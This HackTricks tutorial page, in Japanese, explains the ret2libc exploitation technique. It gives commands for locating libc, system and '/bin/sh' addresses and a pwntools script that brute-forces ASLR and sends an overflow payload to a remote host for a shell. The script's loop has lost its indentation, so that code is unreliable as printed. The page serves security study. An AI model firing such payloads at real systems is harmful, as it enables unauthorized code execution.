# Ret2lib

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **基本情報**

**Ret2Libc**の本質は、脆弱なプログラムの実行フローを攻撃者が提供したスタック上のシェルコードを実行するのではなく、共有ライブラリ内の関数（例：**system**、**execve**、**strcpy**）にリダイレクトすることです。攻撃者は、スタック上の戻りアドレスを目的のライブラリ関数を指すように変更するペイロードを作成し、呼び出し規約に従って必要な引数が正しく設定されるようにします。

### **例の手順（簡略化）**

* 呼び出す関数のアドレス（例：system）と呼び出すコマンド（例：/bin/sh）を取得する
* コマンド文字列を指す最初の引数を渡し、関数への実行フローを生成するROPチェーンを作成する

## アドレスの特定

* 使用する`libc`が現在のマシンのものであると仮定すると、メモリにロードされる場所を次のコマンドで見つけることができます：

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

libcのアドレスがASLRによって変更されているか確認したい場合は、次のようにできます:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* 使用されているlibcを知っていれば、次のコマンドで`system`関数へのオフセットを見つけることも可能です:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* 使用されているlibcを知っていれば、次のようにして文字列`/bin/sh`関数へのオフセットを見つけることも可能です:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### gdb-peda / GEFの使用

使用されているlibcを知っていれば、PedaやGEFを使って**system**関数、**exit**関数、そして文字列**`/bin/sh`**のアドレスを取得することも可能です：
```bash
p system
p exit
find "/bin/sh"
```
### /proc/\<PID>/mapsの使用

プロセスが**子プロセス**を作成するたびに話しかける場合（ネットワークサーバー）、そのファイルを**読み取る**ことを試みてください（おそらくroot権限が必要です）。

ここでは、プロセス内で**libcがどこにロードされているか**、およびプロセスの各子プロセスに対して**どこにロードされるか**を正確に見つけることができます。

![](<../../../.gitbook/assets/image (853).png>)

この場合、**0xb75dc000**にロードされています（これがlibcのベースアドレスになります）。

## 不明なlibc

バイナリがロードしている**libcを知らない**可能性があります（アクセスできないサーバーにあるかもしれません）。その場合、脆弱性を悪用して**いくつかのアドレスをリークし、どのlibc**ライブラリが使用されているかを見つけることができます：

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

これに関するpwntoolsテンプレートは次の場所で見つけることができます：

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

### 2つのオフセットでlibcを知る

ページ[https://libc.blukat.me/](https://libc.blukat.me/)を確認し、libc内の**いくつかの関数のアドレス**を使用して**使用されているバージョン**を特定してください。

## 32ビットでのASLRのバイパス

これらのブルートフォース攻撃は**32ビットシステムにのみ有効**です。

* エクスプロイトがローカルの場合、libcのベースアドレスをブルートフォースすることを試みることができます（32ビットシステムに有用）：
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* リモートサーバーを攻撃する場合、`libc`関数`usleep`のアドレスを**ブルートフォース**することを試みることができます。引数として10を渡します（例えば）。もしある時点で**サーバーが応答するのに10秒余分にかかる**場合、その関数のアドレスを見つけたことになります。

## One Gadget

libcの**特定の**アドレスにジャンプしてシェルを実行します：

{% content-ref url="one-gadget.md" %}
[one-gadget.md](one-gadget.md)
{% endcontent-ref %}

## x86 Ret2lib コード例

この例では、ASLRブルートフォースがコードに統合されており、脆弱なバイナリがリモートサーバーにあります：
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib コード例

以下の例を確認してください:

{% content-ref url="../" %}
[..](../)
{% endcontent-ref %}

## ARM64 Ret2lib の例

ARM64 の場合、ret 命令は x30 レジスタが指している場所にジャンプし、スタックレジスタが指している場所にはジャンプしません。したがって、少し複雑です。

また、ARM64 では命令はその命令が行うことを行います（命令の途中でジャンプして新しい命令に変換することはできません）。

以下の例を確認してください:

{% content-ref url="ret2lib-+-printf-leak-arm64.md" %}
[ret2lib-+-printf-leak-arm64.md](ret2lib-+-printf-leak-arm64.md)
{% endcontent-ref %}

## Ret-into-printf (または puts)

これは、`printf`/`puts` を特定のデータを引数として呼び出すことで **プロセスから情報を漏洩させる** ことを可能にします。例えば、`puts` のアドレスを GOT に入れて `puts` を実行すると、**メモリ内の `puts` のアドレスが漏洩します**。

## Ret2printf

これは基本的に、**Ret2lib を悪用して `printf` フォーマット文字列の脆弱性に変換する** ことを意味します。`ret2lib` を使用して printf を呼び出し、悪用する値を渡します（無駄に聞こえますが可能です）:

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## その他の例と参考文献

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib、libc の関数のアドレスへの漏洩を与え、one gadget を使用
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 ビット、ASLR 有効だが PIE なし、最初のステップはオーバーフローを埋めてから puts を呼び出して漏洩させることです。カナリアを使って ROP ガジェットを作成し、puts を呼び出して GOT から puts のアドレスを漏洩させ、次に `system('/bin/sh')` を呼び出す ROP ガジェットを作成します。
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 ビット、ASLR 有効、カナリアなし、子関数からのメインでのスタックオーバーフロー。ROP ガジェットを使って GOT から puts のアドレスを漏洩させ、その後 one gadget を呼び出します。
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64 ビット、PIE なし、カナリアなし、relro なし、nx。write 関数を使用して write (libc) のアドレスを漏洩させ、one gadget を呼び出します。
* [https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html)
* フォーマット文字列を使用してスタックからカナリアを漏洩させ、バッファオーバーフローを使用して system に呼び出します（それは GOT にあります） `/bin/sh` のアドレスで。
* [https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html)
* 32 ビット、relro なし、カナリアなし、nx、pie。悪いインデックスを悪用してスタックから libc とヒープのアドレスを漏洩させます。バッファオーバーフローを悪用して `system('/bin/sh')` を呼び出す ret2lib を行います（ヒープアドレスはチェックをバイパスするために必要です）。

{% hint style="success" %}
AWS ハッキングを学び、練習する:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP ハッキングを学び、練習する: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks をサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください!
* **💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) または [**Telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の GitHub リポジトリに PR を提出してください。**

</details>
{% endhint %}
